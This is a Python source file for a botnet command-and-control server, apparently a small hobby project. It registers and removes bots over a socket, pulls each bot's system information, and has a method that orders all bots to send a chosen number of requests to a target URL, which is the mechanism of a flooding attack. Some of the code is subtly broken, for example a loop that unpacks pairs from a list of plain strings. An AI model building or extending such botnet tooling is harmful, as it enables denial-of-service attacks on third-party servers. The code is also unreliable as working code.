import http.client
import requests
import socket
import json
import threading

from termcolor import colored, cprint


class CnC:
    """
    Command & Control center of the botnet.
    """

    def __init__(self, host: str, port: int):
        self.address = (host, port)
        self.bots = []
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind(self.address)
        self.socket.listen(10)
        self.socket.settimeout(2)

    def bot_connection(self, stop: threading.Event):

        while not stop.is_set():
            try:
                client, address = self.socket.accept()
            except socket.timeout:
                continue

            address = address[0]
            data = client.recv(1024).decode("utf-8")
            if data == "n":
                self.bots.append(address)
                print(f"bot {address} added")
            elif data == "c":
                try:
                    self.bots.remove(address)
                    print(f"bot {address} removed")
                except ValueError:
                    print(f"{address} not in bot list")
            else:
                raise RuntimeError("Bot message not recognized")
            client.close()
            print(self.list_clients())
            try:
                self.get_info(address)
            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
                cprint(e, 'yellow')
        print("done")

    def send_requests(self, url, n):
        if len(self.bots) == 0:
            raise RuntimeError("No bot connected.")

        for client, _ in self.bots:
            response = requests.post(f"http://{client}:8080", json={'url': url, 'n': n})

    def list_clients(self) -> str:
        if self.bots:
            return "Bots connected:\n" + "\n".join([f"- {b}" for b in self.bots])
        return "No bots connected"

    def get_info(self, address: str):
        response = requests.get(f"http://{address}:8080/info")
        print(f"System info of bot {address}:")
        for k, v in json.loads(response.text).items():
            print(f"\t-{k}: {v}")

    def cli(self):

        stop = threading.Event()
        bot_conn = threading.Thread(target=CnC.bot_connection, args=(cnc, stop))
        bot_conn.start()
        print("Running...", "green")

        choice = int(input("choice:"))
        print(choice)

        if choice == 0:
            cprint("Closing program...", "red")
            stop.set()
            bot_conn.join()


HOST = '127.0.0.1'
PORT = 60000

if __name__ == '__main__':
    cnc = CnC(HOST, PORT)
    cnc.cli()
